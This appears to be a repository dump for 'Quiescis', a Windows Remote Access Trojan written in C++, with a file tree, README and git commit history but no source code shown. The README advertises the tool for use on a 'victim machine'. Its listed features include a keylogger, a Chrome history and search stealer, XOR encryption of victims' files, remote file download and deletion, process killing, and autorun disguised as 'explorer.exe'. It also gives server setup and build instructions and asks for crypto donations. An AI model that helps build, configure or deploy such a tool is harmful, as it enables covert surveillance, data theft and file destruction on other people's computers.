@@ -1,0 +1,957 @@
+======================: FILES :======================
+Quiescis
+├── client
+│   ├── client
+│   │   ├── Autorun.cpp
+│   │   ├── Autorun.h
+│   │   ├── Chrome.cpp
+│   │   ├── Chrome.h
+│   │   ├── client.vcxproj
+│   │   ├── client.vcxproj.filters
+│   │   ├── client.vcxproj.user
+│   │   ├── Config.h
+│   │   ├── Crypt.cpp
+│   │   ├── Crypt.h
+│   │   ├── Info.cpp
+│   │   ├── Info.h
+│   │   ├── Keylogger.cpp
+│   │   ├── Keylogger.h
+│   │   ├── Main.cpp
+│   │   ├── Socket.cpp
+│   │   ├── Socket.h
+│   │   ├── sqlite3.c
+│   │   ├── sqlite3.h
+│   │   ├── Utils.cpp
+│   │   └── Utils.h
+│   └── client.sln
+├── img
+│   ├── chrome_st.png
+│   ├── cryptfile_after.png
+│   ├── cryptfile_before.png
+│   ├── download.png
+│   ├── error.png
+│   ├── header.png
+│   ├── info.png
+│   ├── keylogger.png
+│   ├── kill.png
+│   ├── ls.png
+│   ├── ps.png
+│   └── rm.png
+├── LICENSE
+├── README.md
+└── server
+    ├── server
+    │   ├── Config.h
+    │   ├── Menu.cpp
+    │   ├── Menu.h
+    │   ├── Server.cpp
+    │   ├── server.vcxproj
+    │   ├── server.vcxproj.filters
+    │   ├── server.vcxproj.user
+    │   ├── Utils.cpp
+    │   └── Utils.h
+    └── server.sln
+
+5 directories, 46 files
+======================: README CONTENT :======================
+﻿# Quiescis 1.3.2
+
+<b>Quescis</b> is a powerful Remote Access Trojan for windows computer on C++
+
+## Update 1.3.2
+     1. Passive keylogger! (command keydump)
+     2. Many improvements and optimizations
+
+![alt text](img/header.png)
+
+# Installing
+## Server
+    - Clone this repository 
+    - Get a static ip or purchase VDS
+    - Server Questions cross platform
+      you can run it on linux distributions
+      and windows
+
+### Config settings
+|     option     |                     description                         |
+| -------------- |:--------------------------------------------------------|
+| chrome_stealer | connect sqlite3.h and sqlite3.cpp files to your project |
+|       IP       | white ip of server (default 127.0.0.1)                  |
+|      PORT      | port of ip (default 4001)                               |
+
+
+### <b>Linux distributions</b>:<br/>
+   - cd server/server
+   - set Config.h, change PORT
+   - g++ server.cpp -w
+   - ./a.out
+   
+### <b>Windows</b>:<br/>
+   - cd server
+   - open server.sln in Visual Studio
+   - change PORT in Config.h
+   - compile Ctrl + F5
+   - server.exe in Debug/
+   
+## Client
+
+### Config settings
+|     option     |                     description                         |
+| -------------- |:--------------------------------------------------------|
+|    autorun     | add rat to startup (1-on, 0-off)                        |
+| chrome_stealer | connect sqlite3.h and sqlite3.cpp files to your project |
+|       IP       | white ip of server (default 127.0.0.1)                  |
+|      PORT      | port of ip (default 4001)                               |
+|  autorun_name  | file name at startup (default: "explorer.exe")          |
+|      lang      | language the victime machine (optional) (default: "ru") |
+
+    - Open in Visual Studio client/client.sln
+    - Set the Config.h
+    - Compile Ctrl + F5
+
+# Features
+- ⚙️ Autorun
+- 📋 Information of system
+
+![alt text](img/info.png)
+
+- 🔭 Browse directories, delete files / folders
+
+![alt text](img/ls.png)
+
+![alt text](img/rm.png)
+
+- ✔️ View all processes
+
+![alt text](img/ps.png)
+
+- Ability to delete a process
+
+![alt text](img/kill.png)
+
+- 🔑 Dump all logs by command "keydump"
+
+- 🔒 Encrypting files and directories
+
+before:
+
+![alt text](img/cryptfile_before.png)
+
+after:
+
+![alt text](img/cryptfile_after.png)
+
+- 📲 download file
+
+![alt text](img/download.png)
+
+- 📲 chrome stealer
+-    get history
+-    get information about downloaded files
+-    get search requests
+![alt text](img/chrome_st.png)
+
+- 🔌 Shutting down the operating system
+- 😄 Throw Error MessageBox
+
+![alt text](img/error.png)
+
+# Commands
+|   command   |                    description                 |
+| ----------- |:-----------------------------------------------|
+|     pwd     |  find out current directory                    |
+|     ls      |  list files and dirs                           |
+|  rm, rmdir  |  delete file; delete directory                 |
+|    info     |  system information (cpu, gpu hardware id, os) |
+|     ps      |  process info                                  |
+|    kill     |  kill process                                  |
+|   keydump   |  dump all recorded logs by keylogger           |
+|  cryptfile  |  encrypt file        with using XOR            |
+|  cryptdir   |  encrypt directory   with using XOR            |
+|  download   |  download file                                 |
+|  chrome_st  |  chrome history stealer                        |
+|  shutdown   |  shutting down                                 |
+|   error     |  throw error MessageBox                        |
+
+#  Donate
+    monero: 
+    48TmwHGVsqSKgD7giTALoK7P2muKLTJn5R8s5XtKZL1jEr4MJFBAwczVtofuFGvzsT1CzTcFXotwZCDno1UsskqFFZe9wVC
+
+***
+    bitcoin:
+    18LKUKWAUBAFKzLBdFFkt687vh8rMPhL1u
+***
+    ethereum:
+    0x189a9436b2fbBd0b1C3927E8a398379DBb7105AA
+====================== GIT HISTORY: ======================
+42b3b82 HEAD@{0}: clone: from https://github.com/Nikait/Quiescis
+commit 42b3b82c5f81956fd69d5964232b4a024384b997
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Fri Nov 6 10:50:10 2020 +0300
+
+    Update README.md
+
+commit 1d2a934cc37bd8581c7328dee02b77fa90d320f0
+Author: Nikait <aaanikit@gmail.com>
+Date:   Fri Nov 6 10:43:38 2020 +0300
+
+    update 1.3.2
+
+commit c7ee3920655cae73c622af0ec1f70b1071524bf8
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Wed Nov 4 23:07:59 2020 +0300
+
+    Update Server.cpp
+
+commit 4726a9c0ad4cd68f750cf2dff98bb04a74c34a80
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Wed Nov 4 22:54:48 2020 +0300
+
+    Update README.md
+
+commit a57bc334f3fc91fe849cc1c03e3b3aca66e53326
+Author: Nikait <aaanikit@gmail.com>
+Date:   Wed Nov 4 22:52:41 2020 +0300
+
+    update 1.3.1
+
+commit 60f65a5f4e39732ca9ef6035a6a1c1386d339bd0
+Merge: e638fdd 6f288c0
+Author: Nikait <aaanikit@gmail.com>
+Date:   Wed Nov 4 19:42:35 2020 +0300
+
+    Merge branch 'master' of https://github.com/Nikait/Quiescis into master
+
+commit e638fdd0e04d3d4375f51c00a39d05d4ec609ab4
+Author: Nikait <aaanikit@gmail.com>
+Date:   Wed Nov 4 19:41:59 2020 +0300
+
+    update 1.3.1
+
+commit 98c1be239ea5abfa92d500aea0230e88deef1570
+Author: Nikait <aaanikit@gmail.com>
+Date:   Wed Nov 4 19:41:42 2020 +0300
+
+    update 1.3.1
+
+commit 6f288c06b0842962d61443fdadbb80971acc1eb7
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Tue Nov 3 17:25:03 2020 +0300
+
+    Update README.md
+
+commit 9256f7f5b56d169d92dda47c93bb066cc2ad9107
+Author: Nikait <aaanikit@gmail.com>
+Date:   Tue Nov 3 15:01:19 2020 +0300
+
+    update 1.3.0
+
+commit 002cb03df52dacccff46d106f92acdff35ee3002
+Author: Nikait <aaanikit@gmail.com>
+Date:   Mon Nov 2 18:19:15 2020 +0300
+
+    update 1.3.0
+
+commit 6084bdd3555d172f875195827b17cd5de953e4fe
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Mon Nov 2 18:05:38 2020 +0300
+
+    Update 1.3.0
+
+commit df38dc898deae754301ac8dc86afdd08cdabee6c
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Mon Nov 2 17:56:28 2020 +0300
+
+    Update Main.cpp
+
+commit d7a2baf6829cf368566acf0118ba9ba6cebab1a4
+Merge: 2325809 12f4ac0
+Author: Nikait <aaanikit@gmail.com>
+Date:   Mon Nov 2 17:53:21 2020 +0300
+
+    update 1.3.0
+
+commit 2325809fe487bd444caf26349bb1f1142409c0d5
+Author: Nikait <aaanikit@gmail.com>
+Date:   Mon Nov 2 17:50:06 2020 +0300
+
+    update 1.3.0
+
+commit 12f4ac0f3d0ada2638d81c7c4fb5975b1be97a11
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Wed Oct 7 19:34:31 2020 +0300
+
+    Delete a.out
+
+commit 8c8ace689aac9c553622f001a3224d6dff34fbe0
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 24 17:17:07 2020 +0300
+
+    Update README.md
+
+commit 06a10da13145d571a0cd3ff3ba27114fbff8881b
+Author: Nikait <aaanikiytgmail.com>
+Date:   Thu Sep 24 08:35:36 2020 +0300
+
+    bug fix
+
+commit 4cdcc2e8f4642473584050822d6c1010c0f8015c
+Author: Nikait <aaanikit@gmail.com>
+Date:   Tue Sep 22 20:55:17 2020 +0400
+
+    upd 1.2.6
+
+commit a316ad8504fc303f89fb70486c3ec175f5e66497
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Tue Sep 22 19:47:42 2020 +0300
+
+    Update README.md
+
+commit 2889727f45c0eb1ad6fd4cccb23f9130a8c73fb7
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Tue Sep 22 19:46:41 2020 +0300
+
+    Update 1.2.6
+
+commit 11197b6ebc329f3ac15dafb9a5b3e845de312004
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Tue Sep 22 19:45:50 2020 +0300
+
+    Update 1.2.6
+
+commit a4a1aa0ee43fe6d1f982a5bc3646acb232b15761
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Tue Sep 22 19:44:26 2020 +0300
+
+    Update README.md
+
+commit 7285d7cebeec2f5475390e2dc2a42f266ce13fc4
+Author: Nikait <aaanikit@gmail.com>
+Date:   Tue Sep 22 20:40:03 2020 +0400
+
+    add chrome downloads, search requests
+
+commit 257d7af6d257dfac41dd088bfabc459fdd9a9e61
+Author: Nikait <aaanikiytgmail.com>
+Date:   Mon Sep 21 22:56:24 2020 +0300
+
+    bug fix
+
+commit 508fcc7364f6d73eaf24ea2da796653aa334b43c
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Mon Sep 21 22:38:01 2020 +0300
+
+    Update Server.cpp
+
+commit b522364d9b6c2e74eb45db0d097b72e96dbb9b24
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Mon Sep 21 22:37:17 2020 +0300
+
+    Update 1.2.5
+
+commit 4fecc18afe472adf1bdb5ebdc26ede0948bf6267
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Mon Sep 21 22:36:09 2020 +0300
+
+    Update README.md
+
+commit 2624de04deab72dd49d3ab4fb67a04177a7de0da
+Author: Nikait <aaanikiytgmail.com>
+Date:   Mon Sep 21 22:33:15 2020 +0300
+
+    add chrome
+
+commit 0f4bff0c4879c034c9a840455c34d312570c3282
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Wed Sep 16 19:55:59 2020 +0300
+
+    Update Server.cpp
+
+commit 1bbe71670f7c39f835055a831c6af2dc3f547470
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Wed Sep 16 19:55:22 2020 +0300
+
+    Update 1.2.3
+
+commit b27c229942c8841b39ba9f3ce2787b79170b4fd7
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Wed Sep 16 19:49:41 2020 +0300
+
+    Update README.md
+
+commit effef5f573a37e9a6e7785b3a256d1739da80fce
+Merge: 1485d55 31edfaf
+Author: Nikait <aaanikit@gmail.com>
+Date:   Wed Sep 16 20:45:15 2020 +0400
+
+    Merge branch 'master' of https://github.com/Nikait/Quiescis into master
+
+commit 1485d551a8b3f4b188d042bdc4636d8cfe791396
+Author: Nikait <aaanikit@gmail.com>
+Date:   Wed Sep 16 20:44:20 2020 +0400
+
+    bug fix
+
+commit 28644dbf7a9820f9a38b23f86f94f27b31fa6054
+Author: Nikait <aaanikit@gmail.com>
+Date:   Wed Sep 16 20:44:05 2020 +0400
+
+    bug fix
+
+commit 31edfafb3d378138f2f4e82c96fcfbedd4976607
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Tue Sep 15 20:57:35 2020 +0300
+
+    Update Server.cpp
+
+commit 3c68b446c5d99630b8498a3a2006dda195dcc502
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Tue Sep 15 20:54:07 2020 +0300
+
+    Update Main.cpp
+
+commit 31944be694fc4267d37346bec661edac6392147c
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Tue Sep 15 20:53:38 2020 +0300
+
+    Update README.md
+
+commit 70d13e0e9146f6fbff85575fcd418a5d0192422d
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Tue Sep 15 20:51:58 2020 +0300
+
+    Update README.md
+
+commit 4618652ba3004801bbeebcae7cd6898bb277f41b
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Tue Sep 15 20:51:43 2020 +0300
+
+    Update README.md
+
+commit 22eb6c270bbb2935fe5f34b6350a4f000911f57d
+Author: Nikait <aaanikit@gmail.com>
+Date:   Tue Sep 15 21:37:55 2020 +0400
+
+    new system information
+
+commit 11b69986635ba1756429edcbce06ee7126d5f8ca
+Author: Nikait <aaanikiytgmail.com>
+Date:   Mon Sep 14 21:51:15 2020 +0300
+
+    linux support
+
+commit 5f2b63e6a39f99bb9dd2c0cc727983b2237a71a4
+Author: Nikait <aaanikiytgmail.com>
+Date:   Mon Sep 14 21:47:05 2020 +0300
+
+    linux support
+
+commit e2812a3e2e5d766dcebdf57c603ff84e3d1410d3
+Author: Nikait <aaanikiytgmail.com>
+Date:   Mon Sep 14 21:45:38 2020 +0300
+
+    linux support
+
+commit 0b7900f043ffe1762ab9abbd3f0dcc51c6051422
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Mon Sep 14 20:14:12 2020 +0300
+
+    Update Main.cpp
+
+commit 8121a1e00d9a360ee286c693097189ab268e7f05
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Mon Sep 14 20:13:14 2020 +0300
+
+    Update Server.cpp
+
+commit d55461e9e2475bbb7b2f51142910ea0e2db59d15
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Mon Sep 14 20:11:36 2020 +0300
+
+    Update README.md
+
+commit 532d2920ef57b6648fb48c71bebe945509900322
+Author: Nikait <aaanikit@gmail.com>
+Date:   Mon Sep 14 21:05:50 2020 +0400
+
+    strong encryption
+
+commit 9aff4b8d1d7ae0d0b76f801b186bc6ec40bfc8d7
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Mon Sep 14 11:43:41 2020 +0300
+
+    Update Main.cpp
+
+commit 1f8353dd991b6d4f886dfc93f5f17a6f198b8318
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Sat Sep 12 17:27:07 2020 +0300
+
+    Update Main.cpp
+
+commit b49f2ceca2c0f619d15784784c2b2f8da744964b
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Fri Sep 11 15:31:32 2020 +0300
+
+    Update README.md
+
+commit bbb28b4aa3cf8b3fd0187f44edf016b2a7ee08e2
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Fri Sep 11 00:55:39 2020 +0300
+
+    Update README.md
+
+commit a5d959c335b05089cde5208b6556f3b22e4f7180
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Tue Sep 8 21:49:59 2020 +0300
+
+    Update README.md
+
+commit 36d19b266af769ac7a91dbbd4c4d99bbe08472d7
+Author: Nikait <aaanikit@gmail.com>
+Date:   Tue Sep 8 22:38:01 2020 +0400
+
+    file downloads
+
+commit e0b39bf4c98cf013f9f46111936285c9e446d7fa
+Author: Nikait <aaanikit@gmail.com>
+Date:   Tue Sep 8 22:29:51 2020 +0400
+
+    file downloads
+
+commit ae462b5a00a6f015f79d910909dedec3c52bb0e2
+Merge: 5ce6e0c 8e1aa46
+Author: Nikait <aaanikit@gmail.com>
+Date:   Mon Sep 7 20:02:55 2020 +0400
+
+    Merge branch 'master' of https://github.com/Nikait/Quiescis into master
+
+commit 5ce6e0c965635b3821223311965e548d7b37e975
+Author: Nikait <aaanikit@gmail.com>
+Date:   Mon Sep 7 20:02:38 2020 +0400
+
+    readme update
+
+commit 8e1aa466dff75fdb0a2b329a7da21e487944ea34
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Mon Sep 7 18:58:18 2020 +0300
+
+    Update README.md
+
+commit 227bfcb09bd8545fbb30bb906591b29a2c886ad0
+Author: Nikait <aaanikit@gmail.com>
+Date:   Mon Sep 7 19:56:06 2020 +0400
+
+    readme update
+
+commit 9a996fe92b89a9b5d3d91b6ecc643323b8aafc46
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Mon Sep 7 09:10:21 2020 +0300
+
+    Update Menu.cpp
+
+commit 895c4fcbfd935bcb63fff338bc3ee4f54d7ae6b0
+Merge: bf6f728 799a141
+Author: Nikait <aaanikiytgmail.com>
+Date:   Mon Sep 7 09:07:53 2020 +0300
+
+    Merge branch 'master' of https://github.com/Nikait/Quiescis
+
+commit bf6f728283100b56dc0d03c80f7f2cffcf5fe008
+Author: Nikait <aaanikiytgmail.com>
+Date:   Mon Sep 7 09:07:12 2020 +0300
+
+    banner upd
+
+commit 799a14126bf2ef0bb7c02a34748e05ad3d660b0f
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Sun Sep 6 21:25:40 2020 +0300
+
+    Update Server.cpp
+
+commit f18369eb10f9b6ffce78d964595009b02f68a069
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Sun Sep 6 21:25:15 2020 +0300
+
+    Update Server.cpp
+
+commit e95ae2db06de9e22139749c3a4ac42c890429527
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Sun Sep 6 20:51:26 2020 +0300
+
+    Update README.md
+
+commit df3cd6a558a42067e95bc7afef2b6d1d20df9674
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Sun Sep 6 20:48:34 2020 +0300
+
+    Update Server.cpp
+
+commit 954fb33a8af44b9a63f3babcc2a0f8c79c0653ce
+Author: Nikait <aaanikit@gmail.com>
+Date:   Sun Sep 6 21:44:35 2020 +0400
+
+    colorized update
+
+commit 3d1113dc0eb581ccde6c806cd929b06af75d2f93
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Sun Sep 6 12:43:25 2020 +0300
+
+    Update README.md
+
+commit 4caa1d2411f99711af42f9bfd7c501820832840d
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Sun Sep 6 12:43:00 2020 +0300
+
+    Update README.md
+
+commit ecf255c8ce550f91cec62f69bef30acd3264bf32
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Sun Sep 6 12:39:54 2020 +0300
+
+    Update README.md
+
+commit b1e438f431cdf3ed29978604d5a38e4f9a3d58de
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Sun Sep 6 12:39:30 2020 +0300
+
+    Update README.md
+
+commit 58846192af99bd4fd3f65284bc181b29955d1639
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Sun Sep 6 12:38:51 2020 +0300
+
+    Update README.md
+
+commit 41674e54ee74d2be1a13b8b3572c3ddd150c010a
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Sun Sep 6 12:36:56 2020 +0300
+
+    Update README.md
+
+commit 7dca3629f64d46a5fbee7bec1575065f363b8c2c
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Fri Sep 4 07:00:35 2020 +0300
+
+    Update README.md
+
+commit 58d600cafdc2a02cf283cf5c202973e66ffc4ab1
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 22:38:46 2020 +0300
+
+    Create README.md
+
+commit 50669460ea633797f5469aa56234f67a01fda2d9
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 22:35:58 2020 +0300
+
+    Delete README.md
+
+commit 2c5ba559fc61b97ddf7f4d19fb754929309d0952
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 22:03:45 2020 +0300
+
+    Update README.md
+
+commit 5eb23b51b092eb585214157a777c574daefcae52
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 22:01:19 2020 +0300
+
+    Update README.md
+
+commit a5696f450c316fdb9a434eb53f2405cf56d20546
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 21:57:54 2020 +0300
+
+    Update README.md
+
+commit 07c8763e0d35cc93e9573aafffc01c5ffb208d5c
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 21:50:54 2020 +0300
+
+    Update README.md
+
+commit 4dbfcebe690adf83454165fdee153543917489da
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 21:45:15 2020 +0300
+
+    Update README.md
+
+commit 4bf5802b0c11998b7314df178398ab47920a814e
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 15:00:50 2020 +0300
+
+    Update README.md
+
+commit 2cecb858b4bdae2a58c41c95e3aad27f141c8dd4
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 14:55:32 2020 +0300
+
+    Update README.md
+
+commit 9d7bb7c45f5cc1c7ce6877856792fdd72777c573
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 14:54:13 2020 +0300
+
+    Update README.md
+
+commit 8e0ce04e7b0b67bd1c137047a410ca7d9aad62ca
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 14:53:22 2020 +0300
+
+    Update README.md
+
+commit bdadd0c91761629a33f5e86a0c5e1bc9e074f0f6
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 12:21:18 2020 +0300
+
+    Update README.md
+
+commit 5979ce9df3e6b030d3dfe87f429f08f95fa43c1f
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 12:19:43 2020 +0300
+
+    Update README.md
+
+commit dc9f97361d3cf057a903e911e25caa7f336b0706
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 12:17:39 2020 +0300
+
+    Update README.md
+
+commit 52bbf10a684a0d0b6e1f032350cc3e3edf712926
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 12:16:53 2020 +0300
+
+    Update README.md
+
+commit b9f988fd5f05d01b9adb03ccf3135e09be7c4a5a
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 12:15:37 2020 +0300
+
+    Update README.md
+
+commit eb4a1d016193921d76621d42ba66baf540cba2da
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 12:14:48 2020 +0300
+
+    Update README.md
+
+commit b58fb9c7b1f7f416207641bb38d87a6ca1d94f02
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 12:14:27 2020 +0300
+
+    Update README.md
+
+commit 1681fdf4f0ea20e40b0f01c557908a7282e3f33f
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 12:12:00 2020 +0300
+
+    Update README.md
+
+commit 5addad38ae6570853855f784f6e51846d6be24b1
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 12:11:26 2020 +0300
+
+    Update README.md
+
+commit a71d61f4b4ba35ece9ea880f2cdb7cd01b298a82
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 12:11:05 2020 +0300
+
+    Update README.md
+
+commit e2c6981ad4d1d464dee4e5a0d68ac304ee2c80c7
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 12:09:56 2020 +0300
+
+    Update README.md
+
+commit 460c808b55b3a75dc357ea53850ae90577c7c877
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 12:04:01 2020 +0300
+
+    Update README.md
+
+commit 042c1f0040be050c1dcf1c2dfef8fb85bbe89190
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 12:03:34 2020 +0300
+
+    Update README.md
+
+commit 8a9654cdf9831ca6009f58724d4864c4764625f2
+Merge: 19afe32 ddb01dd
+Author: Nikait <aaanikiytgmail.com>
+Date:   Thu Sep 3 12:00:51 2020 +0300
+
+    Merge branch 'master' of https://github.com/Nikait/Quiescis
+
+commit 19afe3248dbade26e2968d7bbd7688e04328cb1b
+Author: Nikait <aaanikiytgmail.com>
+Date:   Thu Sep 3 11:59:38 2020 +0300
+
+    header image
+
+commit ddb01ddd8dc328e23814d570c7b4195a90d6d36c
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Thu Sep 3 11:56:57 2020 +0300
+
+    Update README.md
+
+commit 3a5a57061547ab5040d62aad7e930ac4767a0a84
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Wed Sep 2 22:21:13 2020 +0300
+
+    Update Server.cpp
+
+commit 2b2ae598e2723c2f2f806c36efba5bd8fa7c273d
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Wed Sep 2 22:19:23 2020 +0300
+
+    Update Server.cpp
+
+commit 8010ed672245f79b30add6168d9ddf3c6fa71b3a
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Wed Sep 2 22:17:18 2020 +0300
+
+    Update Main.cpp
+
+commit 1a8706282f2365cbffbf63bb753cee8e67aa69ef
+Author: Nikait <aaanikiytgmail.com>
+Date:   Wed Sep 2 21:07:38 2020 +0300
+
+    cli upd
+
+commit 907d720c443c928a911542eb369310ada9c7a843
+Author: Nikait <aaanikiytgmail.com>
+Date:   Wed Sep 2 21:06:59 2020 +0300
+
+    cli upd
+
+commit adc2968fa7cc8bf99b9c06fccce90f227612c196
+Merge: 673603d 8f9686d
+Author: Nikait <aaanikiytgmail.com>
+Date:   Wed Sep 2 16:47:03 2020 +0300
+
+    Merge branch 'master' of https://github.com/Nikait/Quiescis
+
+commit 673603d6197ad690d2ce3f04d7f33abda119ae04
+Author: Nikait <aaanikiytgmail.com>
+Date:   Wed Sep 2 16:44:39 2020 +0300
+
+    server upd
+
+commit 8f9686d7c181c67c035770a6bd54ce2aef841234
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Sat Aug 29 21:32:03 2020 +0300
+
+    Update Autorun.h
+
+commit d09d6b1d45ed530d606feec48faa7b6b7febeb0c
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Sat Aug 29 21:28:49 2020 +0300
+
+    Update server.cpp
+
+commit a6e71ef9781a993047e5464bcf67c4b07b9ddb7d
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Sat Aug 29 21:25:39 2020 +0300
+
+    Update server.cpp
+
+commit 049fdf7af5da29cec3d3aae05b49803344e8dc6a
+Author: Nikait <aaanikiytgmail.com>
+Date:   Fri Aug 28 22:50:57 2020 +0300
+
+    server update
+
+commit d5f88e88517dc6aac0cf8c4dd2db26387b449577
+Merge: 0f73612 73fed2a
+Author: Nikait <aaanikiytgmail.com>
+Date:   Fri Aug 28 22:14:41 2020 +0300
+
+    server upd commit.
+
+commit 0f73612ff11993de48281cee26c9e401fd218580
+Author: Nikait <aaanikiytgmail.com>
+Date:   Fri Aug 28 16:44:50 2020 +0300
+
+    server update
+
+commit 73fed2afbc395642dfdd03a5e442ba7983651af3
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Fri Aug 28 00:10:12 2020 +0300
+
+    Delete a.out
+
+commit 2e09bed57972dce6acc1b82445439d5f99bb33be
+Author: Nikait <aaanikiytgmail.com>
+Date:   Thu Aug 27 23:52:52 2020 +0300
+
+    server
+
+commit 834b98ffb76ad7f1ecaad43d63e4a30ebe052311
+Merge: cc5cd33 0e461cc
+Author: Nikait <aaanikiytgmail.com>
+Date:   Thu Aug 27 22:22:30 2020 +0300
+
+    Merge branch 'master' of https://github.com/Nikait/Quiescis
+
+commit cc5cd335036cafef3378f9dd018e416a8b16e416
+Author: Nikait <aaanikiytgmail.com>
+Date:   Thu Aug 27 22:21:10 2020 +0300
+
+    0.1
+
+commit 0e461cca8f6786f239224b5429f5b3fefc87b977
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Wed Aug 26 00:18:00 2020 +0300
+
+    Create README.md
+
+commit f0e7efcca81bc7ea749907e33c22ee8a76dbea52
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Wed Aug 26 00:17:51 2020 +0300
+
+    Delete README.md
+
+commit 8cfafb1a55400ab7d887c3726bff4c85645a8657
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Wed Aug 26 00:17:36 2020 +0300
+
+    Update README.md
+
+commit a921532f992af8404983352390b348d155af1aa8
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Wed Aug 26 00:14:24 2020 +0300
+
+    Delete client upx.exe
+
+commit 145b3153e9b2ca111862927dfa9a5c8c4234f292
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Wed Aug 26 00:14:04 2020 +0300
+
+    Delete client.exe
+
+commit db913eb1e78c5ea50e07961c95ec4c6caf43aea3
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Wed Aug 26 00:13:34 2020 +0300
+
+    Delete server.exe
+
+commit cd0aad9436f1c5bde75d52cbb348f975769402b6
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Wed Aug 26 00:13:23 2020 +0300
+
+    Delete server upx.exe
+
+commit 0dbe0eede84b81be3150dc90587a9866db1ce787
+Author: Nikait <aaanikiytgmail.com>
+Date:   Wed Aug 26 00:10:36 2020 +0300
+
+    Initial commit.
+
